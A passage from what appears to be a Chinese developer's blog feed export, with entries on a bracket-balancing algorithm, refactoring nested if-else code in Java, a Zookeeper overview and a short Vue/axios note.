class="string">'('</span>) &#123;</span><br><span class="line">            need += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (need % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                need--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span class="string">')'</span>) &#123;</span><br><span class="line">            need--;</span><br><span class="line">            <span class="keyword">if</span> (need == <span class="number">-1</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                need = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res + need;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>首先，类似第一题，当<code>need == -1</code>时，意味着我们遇到一个多余的右括号，显然需要插入一个左括号</strong>。</p><p>比如说当<code>s = &quot;)&quot;</code>，我们肯定需要插入一个左括号让<code>s = &quot;()&quot;</code>，但是由于一个左括号需要两个右括号，所以对右括号的需求量变为 1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s[i] == <span class="string">')'</span>) &#123;</span><br><span class="line">    need--;</span><br><span class="line">    <span class="comment">// 说明右括号太多了</span></span><br><span class="line">    <span class="keyword">if</span> (need == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 需要插入一个左括号</span></span><br><span class="line">        res++;</span><br><span class="line">        <span class="comment">// 同时，对右括号的需求变为 1</span></span><br><span class="line">        need = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>另外，当遇到左括号时，若对右括号的需求量为奇数，需要插入 1 个右括号</strong>。因为一个左括号需要两个右括号嘛，右括号的需求必须是偶数，这一点也是本题的难点。</p><p>所以遇到左括号时要做如下判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s[i] == <span class="string">'('</span>) &#123;</span><br><span class="line">    need += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (need % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 插入一个右括号</span></span><br><span class="line">        res++;</span><br><span class="line">        <span class="comment">// 对右括号的需求减一</span></span><br><span class="line">        need--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/代码整洁之道</title>
      <link href="java/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93/"/>
      <url>java/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h1 id="代码逻辑重构"><a href="#代码逻辑重构" class="headerlink" title="代码逻辑重构"></a>代码逻辑重构</h1><a id="more"></a><p>对平常使用的比较繁杂,比较菜的代码进行重构, 以及逻辑优化等</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><h3 id="if-else-优化"><a href="#if-else-优化" class="headerlink" title="if-else 优化"></a>if-else 优化</h3><p> <a href="https://blog.csdn.net/qq_35440678/article/details/77939999" target="_blank" rel="noopener">参考 </a></p><p>if-else 一般两种场景: 异常逻辑 和 不同状态 </p><p> 异常逻辑处理</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">obj</span>  </span>= getObj();</span><br><span class="line"><span class="keyword">if</span>(obj!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//do something</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>状态处理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object obj = getObj();</span><br><span class="line"><span class="keyword">if</span>(obj.getType == <span class="number">1</span> )&#123;</span><br><span class="line"><span class="regexp">//</span><span class="keyword">do</span> something</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj.getType==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="regexp">//</span><span class="keyword">do</span> something</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="regexp">//</span><span class="keyword">do</span> something </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if-else 语句太多会造成 代码逻辑复杂, 维护性差, 极易引发bug </p><p>比如 使用 if(obj.getType==1){}  if(obj.getType==2){} 虽然没有更改代码的 判断数量, 但优化了代码的易读性</p><p>重构 if-else 时, 把握一个原则: </p><p>尽可能地维持正常流程代码在最外层</p><p>介绍一种手法 :</p><p>​    合并条件表达式: <strong>如果有一系列条件测试都得到相同结果，将这些结果测试合并为一个条件表达式。</strong></p><p>可以有效地减少if语句</p><h4 id="异常逻辑处理型重构实例"><a href="#异常逻辑处理型重构实例" class="headerlink" title="异常逻辑处理型重构实例"></a>异常逻辑处理型重构实例</h4><h5 id="一"><a href="#一" class="headerlink" title="一"></a>一</h5><p>重构前</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getPayAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result;</span><br><span class="line">    <span class="keyword">if</span>(_isDead) &#123;</span><br><span class="line">        result = deadAmount();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(_isSeparated)&#123;</span><br><span class="line">            result = separatedAmount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(_isRetired)&#123;</span><br><span class="line">                result = retiredAmount();</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                result = normalPayAmount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> resilt</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重构后 </p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getPayAmount</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_isDead) </span><br><span class="line">        <span class="function"><span class="keyword">return</span> <span class="title">deadAmount</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(_isSeparated)</span><br><span class="line">        <span class="function"><span class="keyword">return</span> <span class="title">separatedAmount</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(_isRetired)</span><br><span class="line">        <span class="function"><span class="keyword">return</span> <span class="title">retiredAmount</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">return</span> <span class="title">normalPayAmount</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>减少if-else嵌套</p><h5 id="二"><a href="#二" class="headerlink" title="二"></a>二</h5><p>重构前</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAdjustedCapital</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">if</span>(_capital &gt; <span class="number">0.0</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(_intRate &gt; <span class="number">0</span> &amp;&amp; _duration &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            resutl = (_income / _duration) *ADJ_FACTOR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>减少嵌套和溢出临时变量 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">double</span> getAdjustedCapital()&#123;</span><br><span class="line">    <span class="keyword">if</span>(_capital &lt;= <span class="number">0.0</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_intRate &gt; <span class="number">0</span> &amp;&amp; _duration &gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (_income / _duration) *ADJ_FACTOR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>维持正常流程代码在最外层, 继续重构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAdjustedCapital</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(_capital &lt;= <span class="number">0.0</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_intRate &lt;= <span class="number">0</span> || _duration &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> (_income / _duration) *ADJ_FACTOR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="四"><a href="#四" class="headerlink" title="四"></a>四</h5><p>重构前</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 查找年龄大于18岁且为男性的学生列表 */</span></span><br><span class="line">   <span class="variable">public</span> <span class="variable">ArrayList</span>&lt;<span class="variable">Student</span>&gt; <span class="function"><span class="title">getStudents</span>(<span class="variable">int</span> <span class="variable">uid</span>)&#123;</span></span><br><span class="line"><span class="function">       <span class="variable">ArrayList</span>&lt;<span class="variable">Student</span>&gt; <span class="variable"><span class="class">result</span></span> = <span class="variable">new</span> <span class="variable">ArrayList</span>&lt;<span class="variable">Student</span>&gt;();</span></span><br><span class="line"><span class="function">       <span class="variable">Student</span> <span class="variable">stu</span> = <span class="title">getStudentByUid</span>(<span class="variable">uid</span>);</span></span><br><span class="line"><span class="function">       <span class="variable"><span class="keyword">if</span></span> (<span class="variable">stu</span> <span class="variable">!</span>= <span class="variable"><span class="literal">null</span></span>) &#123;</span></span><br><span class="line"><span class="function">           <span class="variable">Teacher</span> <span class="variable">teacher</span> = <span class="variable">stu.getTeacher</span>();</span></span><br><span class="line"><span class="function">           <span class="title">if</span>(<span class="variable">teacher</span> <span class="variable">!</span>= <span class="variable"><span class="literal">null</span></span>)&#123;</span></span><br><span class="line"><span class="function">               <span class="variable">ArrayList</span>&lt;<span class="variable">Student</span>&gt; <span class="variable">students</span> = <span class="variable">teacher.getStudents</span>();</span></span><br><span class="line"><span class="function">               <span class="title">if</span>(<span class="variable">students</span> <span class="variable">!</span>= <span class="variable"><span class="literal">null</span></span>)&#123;</span></span><br><span class="line"><span class="function">                   <span class="title">for</span>(<span class="variable">Student</span> <span class="variable">student</span> : <span class="variable">students</span>)&#123;</span></span><br><span class="line"><span class="function">                       <span class="title">if</span>(<span class="variable">student.getAge</span>() &gt; = <span class="number">18</span> &amp;&amp; <span class="variable">student.getGender</span>() == <span class="variable">MALE</span>)&#123;</span></span><br><span class="line"><span class="function">                           <span class="variable"><span class="class">result</span>.add</span>(<span class="variable">student</span>);</span></span><br><span class="line"><span class="function">                       &#125;</span></span><br><span class="line"><span class="function">                   &#125;</span></span><br><span class="line"><span class="function">               &#125;<span class="variable"><span class="keyword">else</span></span> &#123;</span></span><br><span class="line"><span class="function">                   <span class="variable">logger.error</span>(<span class="string">"获取学生列表失败"</span>);</span></span><br><span class="line"><span class="function">               &#125;</span></span><br><span class="line"><span class="function">           &#125;<span class="variable"><span class="keyword">else</span></span> &#123;</span></span><br><span class="line"><span class="function">               <span class="variable">logger.error</span>(<span class="string">"获取老师信息失败"</span>);</span></span><br><span class="line"><span class="function">           &#125;</span></span><br><span class="line"><span class="function">       &#125; <span class="variable"><span class="keyword">else</span></span> &#123;</span></span><br><span class="line"><span class="function">           <span class="variable">logger.error</span>(<span class="string">"获取学生信息失败"</span>);</span></span><br><span class="line"><span class="function">       &#125;</span></span><br><span class="line"><span class="function">       <span class="variable">return</span> <span class="variable"><span class="class">result</span></span>;</span></span><br><span class="line"><span class="function">   &#125;</span></span><br></pre></td></tr></table></figure><p>“箭头型” 代码, 最大的问题是嵌套过深, 解决方法是异常条件先退出, 保持主干流程是 狠心流程</p><p>重构后 :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 查找年龄大于18岁且为男性的学生列表 */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> ArrayList&lt;Student&gt; <span class="title">getStudents</span><span class="params">(<span class="keyword">int</span> uid)</span></span>&#123;</span><br><span class="line">     ArrayList&lt;Student&gt; result = <span class="keyword">new</span> ArrayList&lt;Student&gt;();</span><br><span class="line">     Student stu = getStudentByUid(uid);</span><br><span class="line">     <span class="keyword">if</span> (stu == <span class="keyword">null</span>) &#123;</span><br><span class="line">         logger.error(<span class="string">"获取学生信息失败"</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     Teacher teacher = stu.getTeacher();</span><br><span class="line">     <span class="keyword">if</span>(teacher == <span class="keyword">null</span>)&#123;</span><br><span class="line">         logger.error(<span class="string">"获取老师信息失败"</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     ArrayList&lt;Student&gt; students = teacher.getStudents();</span><br><span class="line">     <span class="keyword">if</span>(students == <span class="keyword">null</span>)&#123;</span><br><span class="line">         logger.error(<span class="string">"获取学生列表失败"</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">for</span>(Student student : students)&#123;</span><br><span class="line">         <span class="keyword">if</span>(student.getAge() &gt; <span class="number">18</span> &amp;&amp; student.getGender() == MALE)&#123;</span><br><span class="line">             result.add(student);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="状态型重构"><a href="#状态型重构" class="headerlink" title="状态型重构"></a>状态型重构</h4><h5 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h5><p> 重构前：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">double</span> getPayAmount()&#123;</span><br><span class="line">    <span class="attribute">Object</span> obj = getObj();</span><br><span class="line">    <span class="attribute">double</span> money = <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">if</span> (obj.getType == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="attribute">ObjectA</span> objA = obj.getObjectA();</span><br><span class="line">        <span class="attribute">money</span> = objA.getMoney()*obj.getNormalMoneryA();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">else</span> if (obj.getType == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="attribute">ObjectB</span> objB = obj.getObjectB();</span><br><span class="line">        <span class="attribute">money</span> = objB.getMoney()*obj.getNormalMoneryB()+<span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 重构后：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">double get<span class="constructor">PayAmount()</span>&#123;</span><br><span class="line">    Object obj = get<span class="constructor">Obj()</span>;</span><br><span class="line">    <span class="keyword">if</span> (obj.getType<span class="operator"> == </span><span class="number">1</span>) &#123;</span><br><span class="line">        return get<span class="constructor">Type1Money(<span class="params">obj</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.getType<span class="operator"> == </span><span class="number">2</span>) &#123;</span><br><span class="line">        return get<span class="constructor">Type2Money(<span class="params">obj</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double get<span class="constructor">Type1Money(Object <span class="params">obj</span>)</span>&#123;</span><br><span class="line">    ObjectA objA = obj.get<span class="constructor">ObjectA()</span>;</span><br><span class="line">    return objA.get<span class="constructor">Money()</span>*obj.get<span class="constructor">NormalMoneryA()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double get<span class="constructor">Type2Money(Object <span class="params">obj</span>)</span>&#123;</span><br><span class="line">    ObjectB objB = obj.get<span class="constructor">ObjectB()</span>;</span><br><span class="line">    return objB.get<span class="constructor">Money()</span>*obj.get<span class="constructor">NormalMoneryB()</span>+<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 if-else 内的代码封装成一个公共函数函数的 好处是屏蔽内部实现，缩短if-else分支的代码。代码结构和逻辑上清晰，能一下看出来每一个条件内做的功能。</p><h5 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h5><p> 针对状态处理的代码，一种优雅的做法是用多态取代条件表达式(《重构》推荐做法)。</p><p>  你手上有个条件表达式，它根据对象类型的不同而选择不同的行为。将这个表达式的每个分支放进一个子类内的覆写函数中，然后将原始函数声明为抽象函数。<br> 重构前：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> getSpeed()&#123;</span><br><span class="line">    <span class="keyword">switch</span>(_type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">EUROPEAN:</span></span><br><span class="line">            <span class="keyword">return</span> getBaseSpeed();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">AFRICAN:</span></span><br><span class="line">            <span class="keyword">return</span> getBaseSpeed()-getLoadFactor()*_numberOfCoconuts;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">NORWEGIAN_BLUE:</span></span><br><span class="line">            <span class="keyword">return</span> (_isNailed)?0:getBaseSpeed(_voltage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 重构后：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span></span>&#123;</span><br><span class="line">    <span class="keyword">abstract</span> double getSpeed();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">European</span> <span class="keyword">extends</span> <span class="title">Bird</span></span>&#123;</span><br><span class="line">    double getSpeed()&#123;</span><br><span class="line">        <span class="keyword">return</span> getBaseSpeed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">African</span> <span class="keyword">extends</span> <span class="title">Bird</span></span>&#123;</span><br><span class="line">    double getSpeed()&#123;</span><br><span class="line">        <span class="keyword">return</span> getBaseSpeed()-getLoadFactor()*_numberOfCoconuts;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NorwegianBlue</span> <span class="keyword">extends</span> <span class="title">Bird</span></span>&#123;</span><br><span class="line">    double getSpeed()&#123;</span><br><span class="line">        <span class="keyword">return</span> (_isNailed)?<span class="number">0</span>:getBaseSpeed(_voltage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可以看到，使用多态后直接没有了if-else，但使用多态对原来代码修改过大，需要一番功夫才行。最好在设计之初就使用多态方式。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p> if-else代码是每一个程序员最容易写出的代码，同时也是最容易被写烂的代码，稍不注意，就产生一堆难以维护和逻辑混乱的代码。</p><p> 针对条件型代码重构把握一个原则：</p><p>  尽可能地维持正常流程代码在最外层，保持主干流程是正常核心流程。<br> 为维持这个原则：合并条件表达式可以有效地减少if语句数目；减少嵌套能减少深层次逻辑；</p><p> 异常条件先退出自然而然主干流程就是正常流程。</p><p> 针对状态处理型重构方法有两种：一种是把不同状态的操作封装成函数，简短if-else内代码行数；另一种是利用面向对象多态特性直接干掉了条件判断。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Zookeeper</title>
      <link href="java/Zookeeper/"/>
      <url>java/Zookeeper/</url>
      
        <content type="html"><![CDATA[<h1 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h1><a id="more"></a><h2 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h2><p>unbutu19.10 虚拟机中 </p><p><img src="../images/Zookeeper/image-20210611164052381.png" alt="image-20210611164052381"></p><p>创建的三个zook 数据文件夹保存地址 </p><p>/zookeeper</p><h2 id="zookeeper-介绍"><a href="#zookeeper-介绍" class="headerlink" title="zookeeper 介绍"></a>zookeeper 介绍</h2><p>Zookeeper就是用来解决分布式协作中的难点的</p><p>zookeeper是google的chubby项目开源实现。最早是hadoop的子项目</p><p><strong>Zookeeper的使用场景：</strong></p><p>小米米聊、淘宝Taokeeper其实是类zookeeper。</p><p>Kafka使用zookeeper。消息发布订阅，其中zk就是用于检测节点崩溃。实现主题的发现，并且保持主题的生产和消费状态。</p><p>Hbase三段查找，Root-Region=》Meta Region=》Region（Table）。hbase的元数据信息放在HBase。HMaster挂掉，马上要节点恢复。<br>Hadoop。NameNode（SecondaryNameNode），HA Hadoop。一般情况下一个简单的hadoop集群，只有一个NameNode，如果NameNode挂掉，hadoop集群不可用。HA Haoop里面就要用到zk。</p><h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><h3 id="Master节点管理"><a href="#Master节点管理" class="headerlink" title="Master节点管理"></a>Master节点管理</h3><p>Master 高可用(挂掉以后,没有能负责工作的) ,保证唯一</p><h3 id="配置文件管理"><a href="#配置文件管理" class="headerlink" title="配置文件管理"></a>配置文件管理</h3><p>统一把配置文件存放zk, 由ZK同一发布修改的内容到各台机器</p><h3 id="发布与订阅"><a href="#发布与订阅" class="headerlink" title="发布与订阅"></a>发布与订阅</h3><p>　　发布者(producer)将数据发布到zk节点上，供订阅者(consumer)动态获取</p><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>　分布式环境访问同一个资源，由第三方配锁实现。<br>　　解决的问题：由zk统一进行协调，保证数据的一致性。</p><h3 id="集群的管理"><a href="#集群的管理" class="headerlink" title="集群的管理"></a>集群的管理</h3><p>　　Worker集群监控。保证主数据和备份数据的一致</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Vue</title>
      <link href="java/Vue/"/>
      <url>java/Vue/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue前端接后端"><a href="#Vue前端接后端" class="headerlink" title="Vue前端接后端"></a>Vue前端接后端</h1><a id="more"></a><h2 id="调用Element-UI-和-axios"><a href="#调用Element-UI-和-axios" class="headerlink" title="调用Element UI 和 axios"></a>调用Element UI 和 axios</h2><p>axios 调用后端接口</p><p>简略版配置 在 main.js </p><p><img src="../images/Vue/image-20210420122604563.png" alt="image-20210420122604563"></p><p>.vue文件中 使用</p><p><img src="../images/Vue/image-20210420122644429.png" alt="image-20210420122644429"></p><p>用上述方式调用axios 包  需要使用 this.$axios 使用 </p><h2 id="前端界面编写"><a href="#前端界面编写" class="headerlink" title="前端界面编写"></a>前端界面编写</h2><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h2 id="调整"><a href="#调整" class="headerlink" title="调整"></a>调整</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/token</title>
      <link href="java/token/"/>
      <url>java/token/</url>
      
